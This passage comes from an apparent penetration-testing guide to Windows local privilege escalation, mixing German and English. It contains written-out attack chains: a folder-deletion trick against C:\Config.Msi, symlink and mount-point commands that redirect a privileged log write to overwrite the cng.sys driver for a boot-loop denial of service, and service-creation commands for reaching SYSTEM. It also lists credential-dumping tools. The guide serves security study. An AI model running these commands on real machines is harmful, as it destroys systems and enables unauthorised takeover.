> Dies zielt auf den internen NTFS-Stream ab, der die Ordner-Metadaten speichert — wenn man ihn löscht, wird der Ordner gelöscht.

5. Schritt 5: Den oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Aber jetzt wird aufgrund von junction + symlink tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von beliebiger Ordnererstellung zu dauerhaftem DoS

Nutze eine Primitive aus, die es dir erlaubt, **einen beliebigen Ordner als SYSTEM/admin zu erstellen** — auch wenn **du keine Dateien schreiben** oder **schwache Berechtigungen setzen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem Kernel-Mode-Treiber `cng.sys`.
- Wenn du ihn **vorab als Ordner anlegst**, kann Windows den tatsächlichen Treiber beim Booten nicht laden.
- Danach versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es erkennt den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder bricht den Bootvorgang ab**.
- Es gibt **kein Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. Boot-Reparatur oder Festplattenzugriff).

### Von privilegierten Log-/Backup-Pfaden + OM symlinks zu beliebigem Datei-Overwrite / Boot DoS

Wenn ein **privilegierter Dienst** Logs/Exports in einen Pfad schreibt, der aus einer **beschreibbaren Config** gelesen wird, leite diesen Pfad mit **Object Manager symlinks + NTFS mount points** um, um den privilegierten Schreibvorgang in ein beliebiges Überschreiben zu verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).

**Voraussetzungen**
- Die Config, die den Zielpfad speichert, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mount Point zu `\RPC Control` und einen OM file symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Eine privilegierte Operation, die in diesen Pfad schreibt (Log, Export, Report).

**Beispielkette**
1. Lies die Config, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Admin um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte darauf, dass die privilegierte Komponente das Log schreibt (z. B. löst der Admin „send test SMS“ aus). Der Schreibvorgang landet jetzt in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows dann dazu, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnen wird.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen, aber wenn eine Kopie in `C:\Windows\System32\cng.sys` existiert, kann sie zuerst versucht werden, was sie zu einem zuverlässigen DoS-Ziel für beschädigte Daten macht.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits einen Prozess mit High Integrity ausführst, kann der **Pfad zu SYSTEM** einfach sein, indem du einfach **einen neuen Service erstellst und ausführst**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referenzen

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
